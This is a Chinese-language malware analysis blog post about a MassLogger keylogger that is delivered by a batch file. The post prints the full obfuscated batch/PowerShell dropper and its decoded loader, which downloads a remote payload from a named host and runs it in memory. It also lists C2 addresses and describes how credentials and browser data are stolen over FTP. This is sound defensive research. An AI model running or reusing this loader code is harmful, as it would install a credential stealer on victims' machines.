> 原文链接: https://www.anquanke.com//post/id/217794 


# 一款由非PE加载起来的新型KeyLogger分析


                                阅读量   
                                **141033**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t015e66b18a09443a9c.jpg)](https://p3.ssl.qhimg.com/t015e66b18a09443a9c.jpg)



## 0x00 前言

样本来源于日常app.any.run的样本

样本MD5：71bdecdea1d86dd3e892ca52c534fa13

样本上传名：exe.PDF.bat

样本上传时间，就是今天（2020年9月10日）下午四点十分

可以看到any.run已经将其标记为恶意并且可以从 any.run的沙箱中看到恶意行为是执行了一段powershell指令。

[![](https://p1.ssl.qhimg.com/t01c74fc81c8b4c752f.png)](https://p1.ssl.qhimg.com/t01c74fc81c8b4c752f.png)

在VT上查了一下样本，惊奇的发现，现在居然只有一家厂商给出了明确的报毒：Downloader.WannaMine

[![](https://p3.ssl.qhimg.com/t01ba707c6620a7644a.png)](https://p3.ssl.qhimg.com/t01ba707c6620a7644a.png)



## 0x01 原始样本

原始样本的确是bat的文件，编辑工具加载后内容如下：

[![](https://p5.ssl.qhimg.com/t01276f5196e3d8d455.png)](https://p5.ssl.qhimg.com/t01276f5196e3d8d455.png)

```
@echo off

Start /MIN Powershell -WindowStyle Hidden -command "$Dxjyp='D4@C7@72@72@02@E6@96@F6@A6@D2@02@37@27@16@86@34@96@96@36@37@16@42@02@D3@76@E6@96@27@47@35@96@96@36@37@16@42@B3@D7@22@F5@42@87@03@22@D5@56@47@97@26@B5@D5@27@16@86@36@B5@B7@02@47@36@56@A6@26@F4@D2@86@36@16@54@27@F6@64@C7@02@72@D2@72@02@47@96@C6@07@37@D2@02@67@D6@42@02@D3@37@27@16@86@34@96@96@36@37@16@42@B3@85@06@54@06@94@C7@72@92@72@72@76@07@A6@E2@23@13@14@F2@97@36@E2@D6@F6@36@E2@16@96@27@47@56@D6@F6@07@F6@47@F2@F2@A3@07@47@47@86@72@72@82@76@E6@96@72@B2@72@27@47@72@B2@72@35@72@B2@72@46@72@B2@72@16@F6@72@B2@72@C6@E6@72@B2@72@77@F6@72@B2@72@44@E2@72@B2@72@92@47@E6@56@72@B2@72@96@C6@72@B2@72@34@72@B2@72@26@56@72@B2@72@75@72@B2@72@E2@47@72@B2@72@56@E4@72@02@B2@72@02@47@72@B2@72@36@72@B2@72@56@A6@72@B2@72@26@72@B2@72@F4@D2@72@B2@72@77@56@72@B2@72@E4@82@72@D3@67@D6@42@B3@23@23@07@42@02@D3@02@C6@F6@36@F6@47@F6@27@05@97@47@96@27@57@36@56@35@A3@A3@D5@27@56@76@16@E6@16@D4@47@E6@96@F6@05@56@36@96@67@27@56@35@E2@47@56@E4@E2@D6@56@47@37@97@35@B5@B3@92@23@73@03@33@02@C2@D5@56@07@97@45@C6@F6@36@F6@47@F6@27@05@97@47@96@27@57@36@56@35@E2@47@56@E4@E2@D6@56@47@37@97@35@B5@82@47@36@56@A6@26@F4@F6@45@A3@A3@D5@D6@57@E6@54@B5@02@D3@02@23@23@07@42@B3@92@76@E6@96@07@42@82@02@C6@96@47@E6@57@02@D7@47@56@96@57@15@D2@02@13@02@47@E6@57@F6@36@D2@02@D6@F6@36@E2@56@C6@76@F6@F6@76@02@07@D6@F6@36@D2@02@E6@F6@96@47@36@56@E6@E6@F6@36@D2@47@37@56@47@02@D3@02@76@E6@96@07@42@B7@02@F6@46@B3@56@E6@F6@26@45@42@02@D4@02@C6@16@37@B3@92@72@94@72@C2@72@A2@72@82@56@36@16@C6@07@56@27@E2@72@85@54@A2@72@D3@56@E6@F6@26@45@42';$text =$Dxjyp.ToCharArray();[Array]::Reverse($text);$tu=-join $text;$jm=$tu.Split('@') | forEach `{`[char]([convert]::toint16($_,16))`}`;$jm -join ''|I`E`X"
```

这是一段很简单的bat内嵌powershell代码，通过bat脚本隐藏窗口执行powershell代码，执行的代码为红色部分。

大概阅读一下这段powershell代码就可以知道这里是将前面的@符号替换并进行转换然后通过最后的I`E`X加载执行。

所以直接把最后面的I`E`X 更改为echo 然后把这一整段powershell代码抽出来保存到一个ps1文件中：

[![](https://p4.ssl.qhimg.com/t01fde9f862016351bb.png)](https://p4.ssl.qhimg.com/t01fde9f862016351bb.png)

然后powershell窗口执行这个ps1脚本，通过管道输出到新文件中，解码出来的内容如下：

[![](https://p2.ssl.qhimg.com/t01fa3ee4d3976fa1a6.png)](https://p2.ssl.qhimg.com/t01fa3ee4d3976fa1a6.png)

这段代码首先是通过$Tbone=’**EX’.replace(‘**‘,’I’)声明了一个名为$Tbone的变量，这个变量实际就是IEX<br>
接着通过sal M $Tbone给变量定义了别名M，可以看到M在程序最后有使用，这是一种免杀操作。

格式化一下代码如下：

[![](https://p4.ssl.qhimg.com/t01f031f02e9a3a4a37.png)](https://p4.ssl.qhimg.com/t01f031f02e9a3a4a37.png)

```
$Tbone='*EX'.replace('*','I');sal M $Tbone;
do`{`
    $ping = test-connection -comp google.com -count 1 -Quiet
`}`
until($ping);
$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
[System.Net.ServicePointManager]::SecurityProtocol = $p22;
$mv='(N'+'ew'+'-O'+'b'+'je'+'c'+'t '+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''http://topometria.com.cy/A12.jpg'')'|I`E`X;
$asciiChars= $mv -split '-' |ForEach-Object `{`[char][byte]"0x$_"`}`;
$asciiString= $asciiChars -join ''|M
```

代码首先会尝试connection连接google.com保证网络畅通。

当确保网络畅通之后，代码在后面拼接一个对象，用于通过IEX执行一个下载指令，将下载回来的内容存储到变量$mv中，这里的下载链接为: [http://topometria.com.cy/A12[.]jpg](http://topometria.com.cy/A12%5B.%5Djpg)

关于topometria，暂时没有相关的威胁情报。

最后，程序将下载回来的数据$mv 以 – 分割，然后作为byte数组加载执行

[![](https://p1.ssl.qhimg.com/t019156363496e0e607.png)](https://p1.ssl.qhimg.com/t019156363496e0e607.png)

还好，现在样本能够正常下载回来。



## 0x02 下载回来的样本分析

下载回来的文件名为A12.jpg，用编辑器打开可以看到是一段以-分割的数据

[![](https://p4.ssl.qhimg.com/t01233aa35f9bb0a579.png)](https://p4.ssl.qhimg.com/t01233aa35f9bb0a579.png)

根据之前的代码操作，可以知道这里会首先将-分割成一个数组，然后转成byte，我们知道最后的数据类型是byte，所以这里直接将- 替换为空格

[![](https://p0.ssl.qhimg.com/t01112dc99ef71772e9.png)](https://p0.ssl.qhimg.com/t01112dc99ef71772e9.png)

然后以byte的形式赋值到010中：

[![](https://p5.ssl.qhimg.com/t011c8b1bda28c4f38f.png)](https://p5.ssl.qhimg.com/t011c8b1bda28c4f38f.png)

这里可以看到，byte解码出来其实是一段脚本代码

通过010转换为文本即可看到源码：

[![](https://p0.ssl.qhimg.com/t01d3b3368eae1a3f23.png)](https://p0.ssl.qhimg.com/t01d3b3368eae1a3f23.png)

所以这是一个3M多的script文件。

看到这种代码不要怕，观察一下就可以找到关键地方

[![](https://p1.ssl.qhimg.com/t017648d60ff9699148.png)](https://p1.ssl.qhimg.com/t017648d60ff9699148.png)

我们首先看看脚本最开始的地方，首先是执行了$t0=-Join ((111, 105, 130)<br>
这里的111 105 130 解出来就是IEX

所以最开始是同样的操作，给IEX声明了一个别名g用于后面调用。

然后程序声明了一个超级长的String，根据开头的[String]$nebj=’4D5A9&gt;^&gt;^3&gt;^可以知道这里其实是一个PE文件，后面肯定会有操作把这里的 特殊符号替换为00

所以跳转到最下面的代码看看：

[![](https://p0.ssl.qhimg.com/t01136e4854c6b1e0ee.png)](https://p0.ssl.qhimg.com/t01136e4854c6b1e0ee.png)

这里首先可以看到， 在刚才声明的长字符串最后，果然通过replace将特殊符号替换为了00

然后可以看到程序执行了一个 [Byte[]]$JJAr=PuKkpsGJ $CDbvWcpeO

这里可以看出来是将$CDbvWcpeO（暂时不知道是什么） 作为参数传递给了PuKkpsGJ 函数，PuKkpsGJ 函数运算之后会得到一个数组赋值给$JJAr

搜索找一下PuKkpsGJ 函数：

[![](https://p3.ssl.qhimg.com/t01c1295cb6401b8fb2.png)](https://p3.ssl.qhimg.com/t01c1295cb6401b8fb2.png)

顺便找到了CDbvWcpeO的定义，这里可以看到，CDbvWcpeO是第二个PE文件。

PuKkpsGJ的功能也很简单，就是对传入进来的内容进行分割和转码。

关于这里处理后的数据之后再看，先看看后面的代码做了什么。

$y=’[System.Ap!%%%%#######@@@@@@@**<strong><strong>********</strong></strong>ain]’.replace(‘!%%%%#######@@@@@@@**<strong><strong>********</strong></strong>‘,’pDom’)|g;$g55=$y.GetMethod(“get_CurrentDomain”)

这类替换之后代码就是：

$y=’[System.AppDomain]’|g;<br>
$g55=$y.GetMethod(“get_CurrentDomain”)

同样的，把下面几行的代码也替换了得到

$uy=’$g55.Invoke($null,$null)’| g<br>
$vmc2=$uy.Load($JJAr)<br>
$vmc2| g

这里很明显，就是最后Invoke load执行$JJAr，而这个$JJAr就是上面通过PuKkpsGJ 处理后的数组。

所以直接写一个ps脚本，把这段数据处理完之后写入到桌面的222.txt文件中即可

[![](https://p5.ssl.qhimg.com/t016d64849f266fae3c.png)](https://p5.ssl.qhimg.com/t016d64849f266fae3c.png)

最后，程序还会通过

解码出第二个PE文件，这里看样子是通过InstallUtil安装，虽然不太看得出来这里是怎么加载起来的，但还是先dump出来后面看看。

计算一下文件hash，分别为：

8A738F0E16C427C9DE68F370B2363230

498EC58566B52AA5875497CADF513547

[![](https://p2.ssl.qhimg.com/t014b5d56da42c53c02.png)](https://p2.ssl.qhimg.com/t014b5d56da42c53c02.png)

对应的检出情况如下：

[![](https://p2.ssl.qhimg.com/t018051bf94f921ebd5.png)](https://p2.ssl.qhimg.com/t018051bf94f921ebd5.png)

498EC58566B52AA5875497CADF513547目前无检出，样本上传之后发现这应该是一个名为Mass KeyLogger的新版本键盘监听器

[![](https://p0.ssl.qhimg.com/t01c9e9d92c18e6ff79.png)](https://p0.ssl.qhimg.com/t01c9e9d92c18e6ff79.png)

而且国外的厂家形容这是非常危险的新型木马

[![](https://p5.ssl.qhimg.com/t01c010cc1e30015aa5.png)](https://p5.ssl.qhimg.com/t01c010cc1e30015aa5.png)

样本使用dnspy去混淆之后还是有比较好的可读性的，这里就大概看一下。

[![](https://p5.ssl.qhimg.com/t01c03aa6d7f91fd361.png)](https://p5.ssl.qhimg.com/t01c03aa6d7f91fd361.png)

此外，dump_file2，也就是这个keylogger的资源中有个四个资源文件，后面可能会解密加载这些资源

[![](https://p4.ssl.qhimg.com/t01b1d63d2407976bb4.png)](https://p4.ssl.qhimg.com/t01b1d63d2407976bb4.png)

首先在dnspy中定位到样本的入口点如下：

[![](https://p5.ssl.qhimg.com/t013057e0fa5fd39c3d.png)](https://p5.ssl.qhimg.com/t013057e0fa5fd39c3d.png)

样本入口点是内部类xW的实例化函数xW()

在xW函数中，主要是调用了aP类的bx方法。

这里过来可以知道bx方法中调用的是pC4类的Fvq方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01264b266e007bf38b.png)

过来给Fvq方法设置一个断点：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019a06019508f9bb2a.png)

在Fvq方法中，程序首先是加载了上面名为LR4Cc2YdSbtlPu3Gpn.gkaT3RqoEIxDLaxtck的资源数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01288fc8abb51ec445.png)

然后把资源赋值给了array数组，并在下面循环取解密这个资源数据

[![](https://p4.ssl.qhimg.com/t01761f1e292dce87fb.png)](https://p4.ssl.qhimg.com/t01761f1e292dce87fb.png)

最后，程序将数据以键值对的方式存放到Dictionary中然后赋值给Jbgkf0diFn，再下面通过放射加载调用。

[![](https://p1.ssl.qhimg.com/t011967cd82cc3e88ea.png)](https://p1.ssl.qhimg.com/t011967cd82cc3e88ea.png)

由于断点已经设置在了Fvq函数这里，直接程序F5过来

成功读取到元数据

[![](https://p2.ssl.qhimg.com/t016e3c1a784615d5f4.png)](https://p2.ssl.qhimg.com/t016e3c1a784615d5f4.png)

成功解密，重新给array赋值：

[![](https://p5.ssl.qhimg.com/t01fa4d6496894eb8cb.png)](https://p5.ssl.qhimg.com/t01fa4d6496894eb8cb.png)

成功生成字典：

[![](https://p1.ssl.qhimg.com/t012310b7ebcd422a67.png)](https://p1.ssl.qhimg.com/t012310b7ebcd422a67.png)

得到要调用的对应的函数，用委托的方式反射加载

[![](https://p2.ssl.qhimg.com/t014430449c9eb54a16.png)](https://p2.ssl.qhimg.com/t014430449c9eb54a16.png)

如下：

[![](https://p2.ssl.qhimg.com/t01091712a361c470d4.png)](https://p2.ssl.qhimg.com/t01091712a361c470d4.png)

这里会遍历加载所有用到的函数

[![](https://p5.ssl.qhimg.com/t0181af99f9bb30025c.png)](https://p5.ssl.qhimg.com/t0181af99f9bb30025c.png)

直接往后走，读取名为b7XmD97o14L13xFEcR.B1Pe7UrZbjaNUkiGSk的资源

[![](https://p4.ssl.qhimg.com/t0101bc72ce56799f70.png)](https://p4.ssl.qhimg.com/t0101bc72ce56799f70.png)

解密一个数据放到array4

[![](https://p1.ssl.qhimg.com/t011ddf29e5652c70d3.png)](https://p1.ssl.qhimg.com/t011ddf29e5652c70d3.png)

这里有一个超长的switch case，干扰分析用的

[![](https://p0.ssl.qhimg.com/t01eb268788c89a7b6c.png)](https://p0.ssl.qhimg.com/t01eb268788c89a7b6c.png)

这个类的代码超级长，肯定不能直接走，但是这里我想，既然它读取了资源放到了array4变量中，后面肯定要操作这个变量的，所以直接对所有操作了aray4这个变量的地方设置断点

这里发现程序将array4的长度new了一个新的byte为array6，所以同样的，对array6所以操作点设置断点：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0196c0bb7f9512ed2e.png)

程序这里在动态解密array6

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018355dd79316f1135.png)

所以最后只保留一个array6的赋值断点即可

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015afced8f1aa21f9f.png)

成功命中断点：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01250d7686d5f2c978.png)

此时把array6给dump出来，这里应该是程序用到的所有的字符串信息

[![](https://p4.ssl.qhimg.com/t01b45d4499278a591a.png)](https://p4.ssl.qhimg.com/t01b45d4499278a591a.png)

往下走，这里result返回回来会有一些用到的关键信息，包括要检测的杀软等：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f17d94882481e08e.png)

后面的解密配置信息，包括ftp服务器的地址，账号密码等都是通过这里解密出来

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014faf16806796d03b.png)

在YWc类的sCo方法中获取一些机密信息并格式化，包括用户名，出口IP、国家信息、操作系统版本、位数、SerialKey、CPU、GPU、AV、Screen Resolution、Current Time、Started、Interval、Process、Melt、Exit after delivery、是否是Administrator、所有运行中的进程名和窗口名（应该是用于反调试检测）

[![](https://p5.ssl.qhimg.com/t0151217cacf6e7c365.png)](https://p5.ssl.qhimg.com/t0151217cacf6e7c365.png)

获取到的完整信息如下：

`{`User Name: xxxxx<br>
IP: 127.0.0.1<br>
Country: CN<br>
Windows OS: Microsoft Windows 7 家庭普通版 64bit<br>
Windows Serial Key: YGFVB-xxxxx-xxxxxx-PTWTJ-YRYRV<br>
CPU: Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz<br>
GPU: VMware SVGA 3D<br>
AV: NA<br>
Screen Resolution: 1920×1080<br>
Current Time: 2020/9/16 12:25:50<br>
Started: 2020/9/16 12:17:21<br>
Interval: 96 hour<br>
Process: C:\Users\xxxx\Desktop\xxxxxxx-cleaned.exe<br>
Melt: false<br>
Exit after delivery: false<br>
As Administrator: False<br>
Processes:<br>
Name:dnSpy-x86, Title:dnSpy v6.0.5 (32-bit, 调试中)<br>
Name:吾爱本地破解工具包, Title:Rolan<br>
`}`

包括后续还会尝试获取各类邮件服务器的隐私信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019347aedca9aa9529.png)

在JA类的KWk方法中尝试获取主流浏览器的隐私信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016b52bbb9dd48027e.png)

[![](https://p5.ssl.qhimg.com/t0135ee1129b34b5df8.png)](https://p5.ssl.qhimg.com/t0135ee1129b34b5df8.png)

将获取到的所有的信息添加到list中并返回

[![](https://p4.ssl.qhimg.com/t012bdcabe505cab640.png)](https://p4.ssl.qhimg.com/t012bdcabe505cab640.png)

获取计算计算机的HWID

[![](https://p0.ssl.qhimg.com/t01bea59a332db8dbfc.png)](https://p0.ssl.qhimg.com/t01bea59a332db8dbfc.png)

将获取到的信息都通过&lt;|| 和||&gt;拼接

[![](https://p4.ssl.qhimg.com/t010f996c80089ae8df.png)](https://p4.ssl.qhimg.com/t010f996c80089ae8df.png)

由于这个样本的代码和功能类实在是太多，这里就不一一详细分析了

[![](https://p0.ssl.qhimg.com/t012ca3d927ae394774.png)](https://p0.ssl.qhimg.com/t012ca3d927ae394774.png)

### <a class="reference-link" name="%E6%B2%99%E7%AE%B1%E5%88%86%E6%9E%90"></a>沙箱分析

直接把样本丢在any.run的沙箱跑一下行为：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017c29d4a68594313d.png)

看起来并没有反调试之类的东西，而且any.run已经识别出来这是一个massLogger了。

这个样本的C2为：192.185.155.49 : 21

这里的端口是21 应该是FTP服务登录的

解析出来的域名是nankasa.com.ar

其中api.ipify.org用于获取用户的出口IP

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019ad0ecf25d8024c6.png)

第二个数据包中就是上传的一些基本信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01da76ee1c4e255574.png)

将数据包下载回来看一下，发现的确是FTP的方式进行通信的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018257dadef0416ea2.png)

然后使用这个用户密码成功登录了攻击者的FTP服务器，这里的命名方式应该是<br>
用户名**地区_HWID**版本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01eddfeb58c6367423.png)

这个文件内容就是从用户主机收集上传的信息，包括之前看到的基本信息以及后面收集的浏览器相关的内容。

[![](https://p5.ssl.qhimg.com/t01df3bc001d93ce185.png)](https://p5.ssl.qhimg.com/t01df3bc001d93ce185.png)

成功获取一组facebook的账号密码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b7deafc340815f08.png)

这里应该是攻击者用于测试的账号密码

睡觉前又看到有新信息上传了 哈哈，但是新文件还是没有数据，应该还是测试或是其他分析人员传的。

[![](https://p2.ssl.qhimg.com/t01bd6c4dfdbd4de7ac.png)](https://p2.ssl.qhimg.com/t01bd6c4dfdbd4de7ac.png)

但是第二天登录的时候，发现密码已经修改了，应该攻击者知道有人异地登录了服务器，于是舍弃了该木马。



## 0x04 小结

看来国外的大佬说此样本可能会取代AgentTesla的身份是有道理的，目前来看，该款木马功能比AgentTesla完善，代码结构更复杂，干扰分析的代码也很多，并且最直接的是，AgentTesla主要是通过多吃解密资源的方式加载，而MassKeLogger使用了多次非PE加载的方式，在这方面的技术已经比较成熟，这样做最直接的好处就是应该会有更好的免杀性。
